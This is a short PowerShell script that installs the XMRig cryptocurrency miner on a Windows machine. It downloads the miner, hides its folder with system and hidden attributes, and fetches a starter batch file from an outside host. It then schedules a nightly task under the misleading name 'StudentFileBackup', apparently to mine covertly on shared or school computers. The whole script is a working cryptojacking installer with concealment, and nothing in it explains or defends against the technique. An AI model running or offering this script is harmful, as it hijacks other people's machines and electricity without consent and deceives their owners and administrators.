echo "INSTALLING MASSEIS"

cd C:\ProgramData

# download XMRig archive
echo ""
iwr https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-gcc-win64.zip -OutFile xmrig.zip

# inflate XMRig archive
echo "inflate XMRig archive"
Expand-Archive ./xmrig.zip

# remove XMRig archive
echo "remove XMRig archive"
rm ./xmrig.zip

# hide XMRig folder
echo "hide XMRig folder"
attrib +s +h ./xmrig

# go to XMRig folder
echo "go to XMRig folder"
cd xmrig
cd xmrig-6.8.2

# download starter file
echo "download starter file"
iwr https://www.thatonelukas.tk/masseisStarter.bat -OutFile starter.bat

# schedule task
echo "schedule task"
schtasks /create /sc daily /tn StudentFileBackup /tr "C:\ProgramData\xmrig\xmrig-6.8.2\starter.bat" /st 20:00 /et 6:30 /k
